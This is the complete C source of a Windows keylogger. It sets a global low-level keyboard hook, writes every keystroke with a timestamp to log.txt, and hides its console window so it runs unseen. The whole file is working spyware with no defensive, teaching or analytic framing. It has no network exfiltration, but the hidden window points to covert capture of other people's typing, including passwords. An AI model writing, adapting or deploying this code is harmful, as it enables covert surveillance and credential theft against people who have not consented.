#include <windows.h>
#include <stdio.h>
#include <time.h>

FILE *logFile;

// Function to log keystrokes
LRESULT CALLBACK KeyloggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbdStruct->vkCode;

        if (logFile) {
            time_t t;
            struct tm *tm_info;
            char timeStr[30];

            time(&t);
            tm_info = localtime(&t);
            strftime(timeStr, 30, "[%Y-%m-%d %H:%M:%S] ", tm_info);
            fprintf(logFile, "%s", timeStr);

            // Handle special keys
            switch (vkCode) {
                case VK_RETURN: fprintf(logFile, "[ENTER]\n"); break;
                case VK_BACK: fprintf(logFile, "[BACKSPACE]"); break;
                case VK_TAB: fprintf(logFile, "[TAB]"); break;
                case VK_SHIFT: fprintf(logFile, "[SHIFT]"); break;
                case VK_CONTROL: fprintf(logFile, "[CTRL]"); break;
                case VK_MENU: fprintf(logFile, "[ALT]"); break;
                case VK_CAPITAL: fprintf(logFile, "[CAPS_LOCK]"); break;
                case VK_SPACE: fprintf(logFile, " "); break;
                default: fprintf(logFile, "%c", (char)vkCode); break;
            }

            fflush(logFile);  // Ensure data is written to the file immediately
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Function to hide the console window
void HideConsole() {
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_HIDE);
}

// Function to properly close the log file when the program exits
void Cleanup() {
    if (logFile) {
        fclose(logFile);
    }
}

int main() {
    HideConsole();  // Hide the console window

    // Open the log file once at the start
    logFile = fopen("log.txt", "a");
    if (!logFile) {
        return 1;  // Exit if file cannot be opened
    }

    // Ensure file closes properly when the program exits
    atexit(Cleanup);

    // Set hook for keyboard events
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyloggerProc, GetModuleHandle(NULL), 0);
    if (!hook) {
        return 1;
    }

    // Message loop to keep the hook running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    UnhookWindowsHookEx(hook);
    return 0;
}
